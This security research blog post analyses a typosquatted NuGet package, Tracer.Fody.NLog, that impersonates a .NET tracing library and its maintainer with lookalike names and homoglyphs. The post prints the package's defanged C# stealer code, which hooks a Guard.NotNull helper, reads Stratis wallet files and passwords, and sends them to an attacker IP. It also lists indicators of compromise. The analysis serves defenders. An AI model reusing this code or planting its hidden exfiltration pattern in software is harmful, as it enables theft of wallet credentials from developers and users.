---
title: "Malicious NuGet Package Typosquats Popular .NET Tracing Library to Steal Wallet Passwords"
short_title: "Malicious NuGet Typosquats .NET Tracing Library"
date: 2025-12-15 12:00:00 +0000
categories: [Malware, NuGet]
tags: [Typosquatting, NuGet, .NET, Stratis, Homoglyphs, Wallet Theft, Fody, Supply Chain Security, Cryptocurrency, T1585, T1587.001, T1608.001, T1195.002, T1204.005, T1036, T1656, T1552, T1005, T1041, T1657]
canonical_url: https://socket.dev/blog/malicious-nuget-package-typosquats-popular-net-tracing-library
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/060d679ce11fe53982f15f69b68710ba9d08ff80-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: Malicious NuGet Package Typosquats Popular .NET Tracing Library
description: "Impostor NuGet package Tracer.Fody.NLog typosquats Tracer.Fody and its author, using homoglyph tricks, and exfiltrates Stratis wallet JSON/passwords to a Russian IP address."
toc: true
---

<div class="prose" dir="ltr">

<p>The Socket Threat Research Team uncovered a malicious NuGet package, <a href="https://socket.dev/nuget/package/tracer.fody.nlog"><code>Tracer.Fody.NLog</code></a>, that typosquats and impersonates the legitimate <a href="https://socket.dev/nuget/package/tracer.fody"><code>Tracer.Fody</code></a> library and its maintainer. It presents itself as a standard .NET tracing integration but in reality functions as a cryptocurrency wallet stealer. Inside the malicious package, the embedded <a href="https://socket.dev/nuget/package/tracer.fody.nlog/files/3.2.4/lib/net46/Tracer.Fody.dll"><code>Tracer.Fody.dll</code></a> scans the default Stratis wallet directory, reads <code>*.wallet.json</code> files, extracts wallet data, and exfiltrates it together with the wallet password to threat actor-controlled infrastructure in Russia at <code>176[.]113[.]82[.]163</code>.</p>

<p><code>Tracer.Fody.NLog</code> looks like a benign <code>NLog</code> adapter for <code>Tracer.Fody</code>, and on the NuGet Gallery it is published under the alias <a href="https://socket.dev/nuget/package/tracer.fody.nlog/maintainers/3.2.2"><code>csnemess</code></a>, a one letter variation of the legitimate maintainer <a href="https://socket.dev/nuget/package/tracer.fody/maintainers/3.3.1"><code>csnemes</code></a>. Inside the compiled <code>Tracer.Fody.dll</code> file, the threat actor added another layer of disguise by using homoglyphs (Cyrillic characters that resemble Latin letters) in attributes and type names. As a result, identifiers such as <code>Тrасer.Fоdy</code> and <code>Guаrd</code> look correct but are backed by different Unicode code points. This combination of lookalike package name, maintainer handle, and homoglyph-based identifiers makes <code>Tracer.Fody.NLog</code> easy to mistake for the genuine project during a manual review.</p>

<p>Once a project references the malicious package, it wires itself into the generic helper <code>Guard.NotNull&lt;T&gt;</code>. The first time that helper receives an object with a <code>WalletPassword</code> property, it starts a background routine that walks <code>%APPDATA%\StratisNode\stratis\StratisMain</code>, reads Stratis <code>*.wallet.json</code> files, and sends a truncated wallet JSON fragment and the associated password to <code>hxxp://176[.]113[.]82[.]163:4444/KV/addentry</code>. The code shows no prompt, writes no logs, and silently catches all exceptions, so the host application appears to run normally while wallet data leaves the compromised system.</p>

<p><code>Tracer.Fody.NLog</code> was published in 2020 and has remained on the NuGet Gallery for more than five years, with roughly 2,000 downloads to date. This long dwell time, combined with its typosquatting and impersonation of the legitimate <code>Tracer.Fody</code> library and maintainer, increases the likelihood that it is already embedded in private Stratis related tools, developer workstations, or CI pipelines. At the time of writing, the malicious package remains live on the NuGet Gallery. We have reported it to the NuGet security team and requested the removal of the package and the suspension of the publisher's account.</p>

<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/05f405a06b398c1478702ea963e66027e779c616-1429x820.png?w=1600&q=95&fit=max&auto=format" alt="Socket AI Scanner analysis comparing Tracer.Fody.NLog and Tracer.Fody"><figcaption><em>Socket AI Scanner's analysis flags the top package, </em><a href="https://socket.dev/nuget/package/tracer.fody.nlog"><code>Tracer.Fody.NLog</code></a><em>, as known malware, while the bottom package, the legitimate </em><a href="https://socket.dev/nuget/package/tracer.fody"><code>Tracer.Fody</code></a><em>, shows no malicious indicators and maintains strong supply chain security and other ratings.</em></figcaption></figure>

<h2>Typosquatting, Impersonation, and Homoglyphs</h2>

<p>Logging frameworks and IL weaving tools such as <code>Fody</code> are deeply trusted in the .NET ecosystem. IL weavers are build-time tools that rewrite compiled .NET assemblies to inject extra behavior, for example adding logging or tracing calls into methods automatically. Teams add them early in a project, wire them into many call sites, and run them in contexts that routinely handle secrets, configuration, and application state. When a threat actor compromises one of these components, their code can execute across many code paths and in sensitive contexts without drawing attention.</p>

<p><code>Fody</code> underpins a large family of IL weavers. Popular extensions like <a href="https://socket.dev/nuget/package/fodyhelpers"><code>FodyHelpers</code></a>, <a href="https://socket.dev/nuget/package/anotar.serilog.fody"><code>Anotar.Serilog.Fody</code></a>, <a href="https://socket.dev/nuget/package/virtuosity.fody"><code>Virtuosity.Fody</code></a>, <a href="https://socket.dev/nuget/package/emptyconstructor.fody"><code>EmptyConstructor.Fody</code></a>, and <a href="https://socket.dev/nuget/package/tostring.fody"><code>ToString.Fody</code></a> each have hundreds of thousands of downloads, and the core tracing weaver <a href="https://socket.dev/nuget/package/tracer.fody"><code>Tracer.Fody</code></a> alone has more than 370,000 downloads on NuGet. Developers are also used to seeing <code>Tracer.*.Fody</code> packages in their dependency trees and generally treat them as routine infrastructure.</p>

<p><code>Tracer.Fody.NLog</code> takes advantage of that familiarity. Its name fits the existing <code>Tracer.*.Fody</code> pattern and its NuGet metadata mirrors the legitimate project, including a maintainer handle that differs from the real <code>csnemes</code> by only a single character (<code>csnemess</code>) and a package description that copies the original <code>Tracer.Fody</code> text verbatim. For someone quickly reviewing dependencies in a <code>.csproj</code> file or browsing the package page on NuGet, it looks like another officially-styled tracing extension rather than a suspicious package.</p>

<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/b5d3ee0d3d63a09b3feb66400498aa5ac8229742-1233x702.png?w=1600&q=95&fit=max&auto=format" alt="NuGet search results showing Tracer.Fody family including malicious package"><figcaption><em>NuGet search results for the </em><em><code>Tracer.Fody</code></em><em> family show three legitimate tracing adapters published by </em><em><code>csnemes</code></em><em> and, at the bottom, the malicious typosquatted package </em><em><code>Tracer.Fody.NLog</code></em><em> published under the look-alike </em><em><code>csnemess</code></em><em> account, which reuses the same description to masquerade as a normal logging integration.</em></figcaption></figure>

<p>In the compiled <code>Tracer.Fody.dll</code> library, the threat actor adds another layer of disguise with homoglyphs. For example, the <code>AssemblyCompany</code> attribute is set to <code>Тrасer.Fоdy</code>, where several characters are Cyrillic lookalikes:</p>

<ul>
<li><code>Т</code> is U+0422, a Cyrillic capital letter "te", instead of U+0054, the Latin capital letter "T"</li>
<li><code>а</code> is U+0430, a Cyrillic small letter "a", instead of U+0061, the Latin small letter "a"</li>
<li><code>с</code> is U+0441, a Cyrillic small letter "es", instead of U+0063, the Latin small letter "c"</li>
<li><code>о</code> is U+043E, a Cyrillic small letter "o", instead of U+006F, the Latin small letter "o".</li>
</ul>

<p>The helper name <code>Guаrd</code> uses the same trick by hiding a Cyrillic <code>а</code> (U+0430) between Latin <code>G</code>, <code>u</code>, <code>r</code>, and <code>d</code>. Visually these identifiers render as <code>Tracer.Fody</code> and <code>Guard</code>, but their underlying Unicode code points are different, which makes simple string-based checks unreliable and helps the malicious library blend in with legitimate <code>Fody</code>-based tooling.</p>

<p><strong>Cautionary note:</strong> AI-generated summaries in search results can unintentionally legitimize malicious software. When we searched for the malicious <code>Tracer.Fody.NLog</code> package, Google's AI Overview described it as a helpful NuGet adapter that integrates <code>Tracer.Fody</code> with <code>NLog</code> and improves logging performance. Do not take AI overviews at face value, and always verify the package name, maintainer, and code before adding a dependency.</p>

<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/1845b21697f0146b0e929ae24462e0a795c96b2b-1015x731.png?w=1600&q=95&fit=max&auto=format" alt="Google AI Overview describing Tracer.Fody.NLog as legitimate"><figcaption><em>Google's AI Overview for </em><em><code>Tracer.Fody.NLog</code></em><em> describes the package as a standard </em><em><code>Tracer.Fody</code></em><em> / </em><em><code>NLog</code></em><em> integration that injects automatic method tracing and optimized logging, reinforcing the appearance of a legitimate logging adapter.</em></figcaption></figure>

<h2>Inside the Wallet Stealing Code</h2>

<p>Below is the threat actor's code from <a href="https://socket.dev/nuget/package/tracer.fody.nlog/files/3.2.2/lib/netstandard2.0/Tracer.Fody.dll"><code>Tracer.Fody.dll</code></a>, defanged and annotated with inline comments that highlight the malicious behavior.</p>

<pre><code class="language-csharp">namespace Tracer.Fody
{
  internal static class Checker
  {
    private static bool alreadyChecked = false;

    // Hardcoded threat actor-controlled server.
    public static string ServerUrl = "hxxp://176[.]113[.]82[.]163:4444";

    public static void Check&lt;T&gt;(T value)
    {
      try
      {
        // Ensure the payload runs only once per process.
        if (!alreadyChecked)
        {
          alreadyChecked = true;

          // Reflection-based access to "WalletPassword"
          // on the object passed into Guard.NotNull&lt;T&gt;.
          string pass = value.GetType()
            .GetProperty("WalletPassword")
            .GetValue(value, null) as string;

          // Fire-and-forget asynchronous exfiltration.
          Task.Run(async () =&gt;
          {
            await CheckAsync(pass).ConfigureAwait(false);
          });
        }
      }
      catch (Exception)
      {
        // Catches all exceptions to avoid breaking the host application,
        // which keeps the malicious behavior stealthy.
      }
    }

    private static async Task CheckAsync(string pass)
    {
      // Small delay, likely to avoid interfering with immediate startup.
      await Task.Delay(10).ConfigureAwait(false);

      // Enumerate all Stratis wallet files in the default data directory:
      // %APPDATA%\StratisNode\stratis\StratisMain\*.wallet.json
      string basePath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "StratisNode\\stratis\\StratisMain");

      foreach (string item in Directory.GetFiles(basePath, "*.wallet.json"))
      {
        // Read the entire wallet JSON file.
        string text = File.ReadAllText(item);

        // Truncate at "blockLocator" to shorten the payload.
        // This includes sensitive wallet metadata.
        string keyFragment = text.Substring(0, text.IndexOf("blockLocator"));

        // Exfiltrate wallet JSON fragment and wallet password.
        SendKV(keyFragment, pass);
      }
    }

    public static void SendKV(string key, string value)
    {
      // Exfiltration over HTTP GET query parameters.
      new WebClient().DownloadString(
        ServerUrl + "/KV/addentry?key=" + key + "&amp;value=" + value);
    }
  }

  public static class Guard
  {
    public static T NotNull&lt;T&gt;(T value, string parameterName)
    {
      if (string.IsNullOrWhiteSpace(parameterName))
        throw new ArgumentNullException(parameterName);

      if (value == null)
        throw new ArgumentNullException(parameterName);

      // Malicious side effect injected into a generic null-check helper.
      // Any call to Guard.NotNull on an object with a WalletPassword property
      // will trigger Checker.Check and therefore wallet data exfiltration.
      Checker.Check(value);
      return value;
    }
  }
}</code></pre>

<p>The code is aimed at Stratis wallets. It hardcodes the Stratis data directory (<code>%APPDATA%\StratisNode\stratis\StratisMain</code>) and scans for <code>*.wallet.json</code> files, then truncates each JSON payload at <code>"blockLocator"</code> before exfiltration. Stratis is a blockchain development platform implemented in C# on the .NET platform and marketed specifically to C# and .NET teams that want to build full nodes, wallets, and smart contracts without leaving their existing tooling.</p>

<p>The <code>WalletPassword</code> property, retrieved via reflection from the object passed into <code>Guard.NotNull&lt;T&gt;</code>, shows that the threat actor expects this helper to run against a wallet model or view model that holds the wallet password in memory. Once it has both the password and the wallet file contents, the code sends an HTTP GET request to <code>hxxp://176[.]113[.]82[.]163:4444/KV/addentry</code>, using the truncated wallet JSON as the <code>key</code> parameter and the password as the <code>value</code>. All exceptions are silently caught, so even if the exfiltration fails, the host application continues to run without any visible error while successful calls quietly leak wallet data to the threat actor's infrastructure.</p>

<h2>Not the Threat Actor's First Rodeo on NuGet Gallery</h2>

<p>The Stratis wallet stealer in <code>Tracer.Fody.NLog</code> is not the first time this infrastructure has targeted .NET developers. In December 2023, Stephen Cleary, maintainer of the <code>AsyncEx</code> libraries on NuGet (for example <a href="https://socket.dev/nuget/package/nito.asyncex/"><code>Nito.AsyncEx</code></a>), <a href="https://x.com/aSteveCleary/status/1730994352132911613">warned</a> that a NuGet package named <a href="https://socket.dev/nuget/package/cleary.asyncextensions"><code>Cleary.AsyncExtensions</code></a> published under the <code>stevencleary</code> alias was not his.</p>

<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/258aad67ea6000bdd0b3937ff128b929ad797c3f-1478x708.png?w=1600&q=95&fit=max&auto=format" alt="Steve Cleary warning post about impersonating NuGet package"><figcaption><em>Steve Cleary </em><a href="https://x.com/aSteveCleary/status/1730994352132911613"><em>posts</em></a><em> about an impersonating NuGet package, </em><a href="https://socket.dev/nuget/package/cleary.asyncextensions"><em><code>Cleary.AsyncExtensions</code></em></a><em> published under </em><em><code>stevencleary</code></em><em>, which adds </em><em><code>NotNull</code></em><em> / </em><em><code>NotEmpty</code></em><em> argument validation helpers that capture parameters named </em><em><code>mnemonic</code></em><em> or </em><em><code>passphrase</code></em><em> and send them to </em><em><code>176[.]113[.]82[.]163:4444</code></em><em>, the same IP and port hardcoded in </em><em><code>Tracer.Fody.NLog</code></em><em> for Stratis wallet exfiltration.</em></figcaption></figure>

<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/b9e4a885753ecf1328cf687a0fb01606c6d02b6b-624x629.png?w=1600&q=95&fit=max&auto=format" alt="Socket AI Scanner analysis of Cleary.AsyncExtensions"><figcaption><em>Socket AI Scanner's analysis of the malicious </em><a href="https://socket.dev/nuget/package/cleary.asyncextensions"><em><code>Cleary.AsyncExtensions</code></em></a><em> package shows a Stratis wallet </em><em><code>Guard</code></em><em> helper that siphons mnemonic and passphrase values from </em><em><code>NotNull</code></em><em> / </em><em><code>NotEmpty</code></em><em> checks into a background task, then quietly exfiltrates them to </em><em><code>176[.]113[.]82[.]163:4444</code></em><em> while suppressing exceptions and hiding behind homoglyph-based identifiers.</em></figcaption></figure>

<p>The IP <code>176[.]113[.]82[.]163</code> remains reachable and routable. It belongs to AS 48347 (MTW-AS), with WHOIS records attributing it to MT Finance LLC in Moscow, Russia. Recent scan data identifies a Windows host exposing several remote access services. Certificate telemetry shows an RDP service presenting the hostname <code>WIN-FTDPCG4548K</code>, with observations continuing into December 2025, which indicates the system is online and in active use.</p>

<h2>Outlook and Recommendations</h2>

<p>By targeting IL weaving and logging adapters, typosquatting a well-known tracing library, and wiring its payload into generic helpers like <code>Guard.NotNull</code>, the threat actor turned routine parameter validation into a covert channel for Stratis wallet theft.</p>

<p>Defenders should expect to see similar activity and follow-on implants that extend this pattern. Likely targets include other logging and tracing integrations, argument validation libraries, and utility packages that are common in .NET projects. We anticipate variations that generalize beyond Stratis, for example targeting other blockchain wallets, cloud credentials, or authentication secrets, as well as new typosquats reusing homoglyph tricks and impersonated maintainers. The fact that this package remained live on NuGet for more than five years demonstrates that once such an implant lands in a popular ecosystem, it can persist quietly unless someone is explicitly looking for behavioral red flags rather than just CVEs.</p>

<p>Socket's security tooling is designed for exactly these types of supply chain threats. The <a href="https://socket.dev/features/github"><strong>Socket GitHub App</strong></a> provides real-time pull-request scanning, surfacing suspicious or malicious dependencies like <code>Tracer.Fody.NLog</code> and <code>cleary.asyncextensions</code> before they merge. The <a href="https://socket.dev/features/cli"><strong>Socket CLI</strong></a> integrates into local development and CI workflows, analyzing packages during install time and enforcing allow/deny rules on behaviors such as unexpected network egress, filesystem writes, post-install scripts, and native binaries.</p>

<p>The <a href="https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1"><strong>Socket browser extension</strong></a> augments NuGet and other registry pages with live risk signals, warning developers when a package shows signs of malice. Finally, <a href="https://socket.dev/blog/socket-mcp"><strong>Socket MCP</strong></a> extends these protections into AI-assisted coding environments, detecting and warning when LLMs suggest malicious, typosquatted, or hallucinated packages before they enter your codebase.</p>

<h2>Indicators of Compromise (IOCs)</h2>

<h3>Malicious NuGet Packages</h3>
<ul>
<li><a href="https://socket.dev/nuget/package/tracer.fody.nlog"><code>Tracer.Fody.NLog</code></a></li>
<li><a href="https://socket.dev/nuget/package/cleary.asyncextensions"><code>Cleary.AsyncExtensions</code></a></li>
</ul>

<h3>Threat Actor's NuGet Aliases</h3>
<ul>
<li><a href="https://socket.dev/nuget/package/tracer.fody.nlog/maintainers/3.2.2"><code>csnemess</code></a></li>
<li><a href="https://www.nuget.org/profiles/stevencleary"><code>stevencleary</code></a></li>
</ul>

<h3>Network Indicators</h3>
<ul>
<li><code>176[.]113[.]82[.]163</code></li>
<li><code>hxxp://176[.]113[.]82[.]163:4444</code></li>
<li><code>hxxp://176[.]113[.]82[.]163:4444/KV/addentry</code></li>
</ul>

<h2>MITRE ATT&CK</h2>
<ul>
<li>T1585 — Establish Accounts</li>
<li>T1587.001 — Develop Capabilities: Malware</li>
<li>T1608.001 — Stage Capabilities: Upload Malware</li>
<li>T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain</li>
<li>T1204.005 — User Execution: Malicious Library</li>
<li>T1036 — Masquerading</li>
<li>T1656 — Impersonation</li>
<li>T1552 — Unsecured Credentials</li>
<li>T1005 — Data from Local System</li>
<li>T1041 — Exfiltration Over C2 Channel</li>
<li>T1657 — Financial Theft</li>
</ul>

</div>
